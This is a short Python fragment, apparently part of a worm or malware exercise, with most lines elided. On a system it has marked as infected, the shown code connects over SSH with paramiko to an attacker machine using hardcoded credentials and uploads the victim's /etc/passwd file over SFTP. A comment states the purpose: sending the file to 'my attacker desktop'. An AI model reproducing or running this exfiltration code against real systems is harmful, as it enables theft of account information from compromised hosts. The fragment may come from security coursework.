...
if len(sys.argv) < 2:
	...
	if isInfectedSystem():
		...
		##THIS copies the passwd file and sends it to my attacker desktop 
		if getMyIP(1) is not attackerIP:
			ssh = paramiko.SSHClient()
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			ssh.connect(attackerIP, username= "ubuntu",password= "123456")
			sftpClient = ssh.open_sftp()
			sftpClient.put("/etc/passwd", "/home/ubuntu/Desktop/" +"passwd_" + getMyIP(1)) 
